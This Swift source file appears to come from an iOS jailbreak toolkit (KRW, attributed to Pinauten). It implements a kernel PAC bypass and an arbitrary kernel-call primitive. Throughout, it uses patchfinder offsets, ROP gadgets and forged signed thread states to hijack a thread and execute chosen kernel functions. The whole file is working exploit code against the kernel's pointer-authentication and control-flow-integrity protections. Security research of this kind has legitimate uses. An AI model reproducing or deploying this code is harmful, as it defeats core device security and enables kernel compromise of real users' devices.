//
//  Kcall.swift
//  KRW
//
//  Created by Linus Henze on 2023-01-14.
//  Copyright © 2023 Pinauten GmbH. All rights reserved.
//  

import Foundation
import KRWC

fileprivate func offsetof<T>(_ path: PartialKeyPath<T>) -> UInt64 {
    UInt64(MemoryLayout.offset(of: path)!)
}

public extension KRW {
    static func doPacBypass() throws {
        try doInit()
        
        guard !didInitPAC else {
            return
        }
        
        logger("Status: Patchfinding")
        
        gOffsets.slide = try kslide()
        gOffsets.allproc = (patchfinder.allproc!)
        gOffsets.itkSpace = patchfinder.ITK_SPACE!
        gOffsets.cpu_ttep = (patchfinder.cpu_ttep!)
        gOffsets.pmap_enter_options_addr = (patchfinder.pmap_enter_options_addr!)
        gOffsets.hw_lck_ticket_reserve_orig_allow_invalid_signed  = (patchfinder.hw_lck_ticket_reserve_orig_allow_invalid_signed!)
        gOffsets.hw_lck_ticket_reserve_orig_allow_invalid = (patchfinder.hw_lck_ticket_reserve_orig_allow_invalid!)
        gOffsets.brX22 = (patchfinder.br_x22_gadget!)
        gOffsets.exceptionReturn = (patchfinder.exception_return!)
        gOffsets.ldp_x0_x1_x8_gadget = (patchfinder.ldp_x0_x1_x8_gadget!)
        gOffsets.exception_return_after_check = (patchfinder.exception_return_after_check!)
        gOffsets.exception_return_after_check_no_restore = (patchfinder.exception_return_after_check_no_restore!)
        gOffsets.str_x8_x9_gadget = (patchfinder.str_x8_x9_gadget!)
        gOffsets.str_x0_x19_ldr_x20 = (patchfinder.str_x0_x19_ldr_x20!)
        gOffsets.pmap_set_nested = (patchfinder.pmap_set_nested!)
        gOffsets.pmap_nest = (patchfinder.pmap_nest!)
        gOffsets.pmap_remove_options = (patchfinder.pmap_remove_options!)
        gOffsets.pmap_mark_page_as_ppl_page = (patchfinder.pmap_mark_page_as_ppl_page!)
        gOffsets.pmap_create_options = (patchfinder.pmap_create_options!)
        gOffsets.ml_sign_thread_state = (patchfinder.ml_sign_thread_state!)
        gOffsets.kernel_el_cpsr = patchfinder.kernel_el! << 2
        gOffsets.TH_RECOVER = patchfinder.TH_RECOVER!
        gOffsets.TH_KSTACKPTR = patchfinder.TH_KSTACKPTR!
        gOffsets.ACT_CONTEXT = patchfinder.ACT_CONTEXT!
        gOffsets.ACT_CPUDATAP = patchfinder.ACT_CPUDATAP!
        gOffsets.PORT_KOBJECT = 0
        gOffsets.VM_MAP_PMAP = patchfinder.VM_MAP_PMAP!
        gOffsets.PORT_LABEL = patchfinder.PORT_LABEL!
        
        logger("Status: Bypassing PAC")
        
        gOurTask = ourProc!.task!.address
        
        if !breakCFI(try kbase()) {
            throw KRWError.failed(providerError: 1337)
        }
        
        print("[+++] Bypassed PAC!")
        
        setupFugu14Kcall()
        deinitFugu15PACBypass()
        
        print("[+++] Inited Fugu14 kcall!")
        
        didInitPAC = true
    }
    
    @discardableResult
    static func kcall(func: UInt64, a1: UInt64, a2: UInt64, a3: UInt64, a4: UInt64, a5: UInt64, a6: UInt64, a7: UInt64, a8: UInt64, a_x8: UInt64 = 0, a_x9: UInt64 = 0) throws -> UInt64 {
        try doPacBypass()
        
        return KRWC.kcall(`func`, a1, a2, a3, a4, a5, a6, a7, a8, a_x8, a_x9)
    }
    
    static func pacda(value: UInt64, context: UInt64, blendFactor: UInt16? = nil) throws -> UInt64 {
        var ctx = context
        if let factor = blendFactor {
            ctx = (ctx & ~0xFFFF000000000000) | (UInt64(factor) << 48)
        }
        
        let buf = try alloc(size: 0x8)
        
        _ = try kcall(func: try slide(virt: patchfinder.pacda_gadget!), a1: 0, a2: value, a3: 0, a4: 0, a5: 0, a6: 0, a7: 0, a8: 0, a_x8: buf, a_x9: ctx)
        
        return try r64(virt: buf)
    }
    
    static func initKCallInThread(thread: UInt64) throws {
        let CPSR_KERN_INTR_DIS: UInt32 = 0x4013c0 | UInt32(patchfinder.kernel_el! << 2)
        
        let thread = KThread(address: thread)
        guard let actContext = thread.actContext else {
            fatalError("[initKCallInProcess] Failed to find thread act context!")
        }
        
        let str_x8_x9_gadget = try slide(virt: patchfinder.str_x8_x9_gadget!)
        let exception_return_after_check = try slide(virt: patchfinder.exception_return_after_check!)
        let brX22 = try slide(virt: patchfinder.br_x22_gadget!)
        
        try kcall(func: slide(virt: patchfinder.ml_sign_thread_state!), a1: actContext, a2: str_x8_x9_gadget /* pc */, a3: UInt64(CPSR_KERN_INTR_DIS) /* cpsr */, a4: exception_return_after_check /* lr */, a5: 0 /* x16 */, a6: brX22 /* x17 */, a7: 0, a8: 0)
        
        try w64(virt: actContext + offsetof(\kRegisterState.pc), value: str_x8_x9_gadget)
        try w32(virt: actContext + offsetof(\kRegisterState.cpsr), value: CPSR_KERN_INTR_DIS)
        try w64(virt: actContext + offsetof(\kRegisterState.lr), value: exception_return_after_check)
        try w64(virt: actContext + offsetof(\kRegisterState.x.16), value: 0)
        try w64(virt: actContext + offsetof(\kRegisterState.x.17), value: brX22)
    }
    
    static var userReturnThreadContext: UInt64? = {
        var state = arm_thread_state64_t()
        
        set_thread_state_to_pac_loop(&state)
        var chThread: thread_t = 0
        let kr = withUnsafeMutablePointer(to: &state) { ptr in
            thread_create_running(mach_task_self_, ARM_THREAD_STATE64, UnsafeMutableRawPointer(ptr).assumingMemoryBound(to: natural_t.self), 68, &chThread)
        }
        guard kr == KERN_SUCCESS else {
            return nil
        }
        
        thread_suspend(chThread)
        
        let kThread = try? KThread(address: (ourProc?.task?.getKObject(ofPort: chThread))!)
        
        return kThread?.actContext
    }()
    
    static func receiveKCall(thPort: mach_port_t) throws {
        let CPSR_KERN_INTR_EN: UInt32 = 0x401000 | UInt32(patchfinder.kernel_el! << 2)
        
        let th = try ourProc!.task!.getKObject(ofPort: thPort)
        let thread = KThread(address: th)
        let actContext = thread.actContext.unsafelyUnwrapped
        
        let stack = try alloc(size: 0x4000 * 4)  + 0x8000
        let stackMapped = try map(virt: stack, size: 0x4000)
        let mappedState = stackMapped!.assumingMemoryBound(to: kRegisterState.self)
        
        // Use str x8, [x9] gadget to set TH_KSTACKPTR
        try w64(virt: actContext + offsetof(\kRegisterState.x.8), value: stack + 0x10)
        try w64(virt: actContext + offsetof(\kRegisterState.x.9), value: th + patchfinder.TH_KSTACKPTR.unsafelyUnwrapped)
        
        // SP and x0 should both point to the new CPU state
        try w64(virt: actContext + offsetof(\kRegisterState.sp), value: stack)
        try w64(virt: actContext + offsetof(\kRegisterState.x.0), value: stack)
        
        // x2 -> new cpsr
        // Include in signed state since it is rarely changed
        try w64(virt: actContext + offsetof(\kRegisterState.x.2), value: UInt64(CPSR_KERN_INTR_EN))
        
        // Create a copy of this state
        signedState = try kread(virt: actContext, size: MemoryLayout<kRegisterState>.size)
        
        // Set a custom recovery handler
        let hw_lck_ticket_reserve_orig_allow_invalid = try slide(virt: patchfinder.hw_lck_ticket_reserve_orig_allow_invalid!) + 0x4
        
        // x1 -> new pc
        // x3 -> new lr
        try w64(virt: actContext + offsetof(\kRegisterState.x.1), value: hw_lck_ticket_reserve_orig_allow_invalid)
        
        // New state
        // Force a data abort in hw_lck_ticket_reserve_orig_allow_invalid
        mappedState.pointee.x.0 = 0
        
        // Fault handler is br x22 -> set x22
        mappedState.pointee.x.22 = try slide(virt: patchfinder.exception_return!)
        
        // Exception return expects a signed state in x21
        mappedState.pointee.x.21 = userReturnThreadContext!
        
        // Also need to set sp
        mappedState.pointee.sp = stack
        
        // Reset flag
        gUserReturnDidHappen = 0
        
        // Sync all changes
        // (Probably not required)
        OSMemoryBarrier()
        
        // Run the thread
        thread_resume(thPort)
        
        // Wait for flag to be set
        while gUserReturnDidHappen == 0 { }
        
        // Stop thread
        thread_suspend(thPort)
        thread_abort(thPort)
        
        // Done!
        Self.actContext = actContext
        Self.mappedState = mappedState
        Self.scratchMemory = stack + 0x7000
        Self.scratchMemoryMapped = try map(virt: stack + 0x4000, size: 0x4000)?.advanced(by: 0x3000).assumingMemoryBound(to: UInt64.self)
        Self.kernelStack = stack
        Self.kcallThread = thPort
    }
    
    static func swift_kcall(func: UInt64, a1: UInt64, a2: UInt64, a3: UInt64, a4: UInt64, a5: UInt64, a6: UInt64, a7: UInt64, a8: UInt64) throws -> UInt64 {
        // Restore signed state first
        try kwrite(virt: actContext, data: signedState)
        
        // Set pc to the function, lr to str x0, [x19]; ldr x??, [x20]; gadget
        let str_x0_x19_ldr_x20 = try slide(virt: patchfinder.str_x0_x19_ldr_x20!)
        
        // x1 -> new pc
        // x3 -> new lr
        try w64(virt: actContext + offsetof(\kRegisterState.x.1), value: `func`)
        try w64(virt: actContext + offsetof(\kRegisterState.x.3), value: str_x0_x19_ldr_x20)
        
        // New state
        // x19 -> Where to store return value
        mappedState.pointee.x.19 = scratchMemory
        
        // x20 -> NULL (to force data abort)
        mappedState.pointee.x.20 = 0
        
        // x22 -> exceptionReturn
        mappedState.pointee.x.22 = try slide(virt: patchfinder.exception_return!)
        
        // Exception return expects a signed state in x21
        mappedState.pointee.x.21 = userReturnThreadContext!
        
        // Also need to set sp
        mappedState.pointee.sp = kernelStack;
        
        // Set args
        mappedState.pointee.x.0 = a1;
        mappedState.pointee.x.1 = a2;
        mappedState.pointee.x.2 = a3;
        mappedState.pointee.x.3 = a4;
        mappedState.pointee.x.4 = a5;
        mappedState.pointee.x.5 = a6;
        mappedState.pointee.x.6 = a7;
        mappedState.pointee.x.7 = a8;
        
        // Reset flag
        gUserReturnDidHappen = 0;
        
        // Sync all changes
        // (Probably not required)
        OSMemoryBarrier()
        
        // Run the thread
        thread_resume(kcallThread);
        
        // Wait for flag to be set
        while gUserReturnDidHappen == 0 { }
        
        // Stop thread
        thread_suspend(kcallThread);
        thread_abort(kcallThread);
        
        // Sync all changes
        // (Probably not required)
        OSMemoryBarrier()
        
        // Copy return value
        return scratchMemoryMapped[0]
    }
}
